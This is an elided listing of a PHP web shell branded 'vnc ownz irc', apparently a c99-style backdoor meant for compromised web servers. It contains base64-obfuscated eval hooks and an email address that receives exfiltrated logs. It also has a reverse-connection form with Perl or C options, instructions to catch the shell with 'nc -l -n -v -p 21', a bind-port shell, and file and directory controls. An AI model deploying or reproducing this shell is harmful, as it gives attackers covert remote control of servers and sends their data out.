...
#           www.ownzirc.com.br            # 
########################################### 
$sh_id = "dm5jIG93bnogaXJj";
$sh_name = base64_decode($sh_id);
$sh_mainurl = "http://aula3.usmpvirtual.edu.pe/vnc/bate.gif";
$html_start = ''.
'<html><head>
</head>
	<BODY ><center>
	...
	<img src="http://aula3.usmpvirtual.edu.pe/vnc/bate.gif">
	<br><br>
...
table { width:100%; }
table,td { border:1px solid #FF0000;margin-top:2;margin-bottom:2;padding:5px; }
...
#pagebar { font:10pt tahoma;padding:5px; border:3px solid #000000; border-collapse:collapse; }
...
$tmpdir = ""; 
$tmpdir_log = "./";
$log_email = "2014promete@gmail.com"; //email untuk pengiriman log.
...
$shell_data = ""; eval(base64_decode($shell_data));
...
if ($act != "img") {
  ...
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=#FFFFFF><b>SAFE MODE is ON (Secure)</b></font>";
  }
  else {
    $safemode = FALSE;
    $hsafemode = "<font color=#0000FF><b>SAFE MODE is OFF (Not Secure)</b></font>";
  }
...
/***** HTML START *****/
echo $html_start;
echo "<div class=barheader2><h3>$sh_name</h3>-=| jatimcrew.org | viking_fronteira@yahoo.com|=-</div>\n";
...
$image="";echo eval(base64_decode($image));?>
</p>
<div class=fright>
...
if ($act == "feedback") {
  $suppmail = base64_decode("YWluZzE4MkBnbWFpbC5jb20=");
  if (!empty($submit)){
...
if ($act == "backc") {
  ...
  echo("<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=21> Use: <select size=1 name=use><option value=Perl>Perl</option><option value=C>C</option></select> <input type=submit name=submit value=Connect></form>Click 'Connect' only after you open port for it first. Once open, use NetCat, and run '<b>nc -l -n -v -p 21</b>'<br><br></center>");
  echo("$msg");
  echo("$emsg");
}
if ($act == "shbd"){
  ...
  Bind Port: <input type='text' name='backconnectport' value='21'>
...
<tr><td align=right>Make Dir:</td>
<td><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">
    <input type="text" name="mkdir" size="70" value="<?php echo $dispd; ?>"> - <input type=submit value="Create"> <?php echo $wdt; ?>
    </form></td></tr>
...
<div class=barheader2 colspan=2><font color=red><font size=2>-=| vnc ownz irc <font color=white>Generated: <?php echo round(getmicrotime()-starttime,4); ?> seconds |=-</font></div>
</body></html>
